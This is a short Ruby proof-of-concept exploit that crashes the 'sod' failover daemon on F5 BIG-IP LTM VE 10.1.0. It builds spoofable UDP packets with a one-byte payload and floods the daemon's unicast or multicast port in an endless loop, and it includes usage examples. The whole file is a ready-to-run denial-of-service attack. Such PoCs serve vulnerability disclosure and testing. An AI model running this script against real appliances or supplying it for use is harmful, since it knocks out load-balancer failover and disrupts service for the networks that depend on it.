#!/usr/bin/env ruby

# PoC script for crashing sod daemon on F5 BIG-IP LTM VE 10.1.0

# Usage examples:
# unicast:   ./f5-soddos.rb eth1 192.168.1.21 192.168.1.20 1026
# multicast: ./f5-soddos.rb eth1 192.168.1.1 224.0.0.245 62960

require 'rubygems'
require 'racket'

include Racket

unless (ARGV.size == 4)
  puts "Usage: #{$0} <iface> <src-ip> <dst-ip> <port>"
  exit
end

n = Racket::Racket.new
n.iface = ARGV[0]

# L2 definition will be created automagically
n.l3 = L3::IPv4.new
n.l3.src_ip = ARGV[1]
n.l3.dst_ip = ARGV[2]
# Default TTL for F5 BIG-IP LTM VE
n.l3.ttl = 64
n.l3.protocol = 17

n.l4 = L4::UDP.new
n.l4.src_port = rand(5000) + 1024
# Port on which 'sod' is listening
# Default: 1026 (unicast), 62960 (multicast)
n.l4.dst_port = ARGV[3].to_i

n.l4.payload = "\x01"
#n.l4.payload = "\x41" 

n.l4.fix!(n.l3.src_ip,n.l3.dst_ip)

while true
  begin
    b = n.sendpacket
    puts "[+] Sent #{b} bytes. Payload: #{n.l4.payload.unpack('H*')}"
    # Sleep for "Link Down Time on Failover" period
    sleep 0.1
  rescue Interrupt
    puts "\n[-] Interrupted by user..."
    exit
  end
end
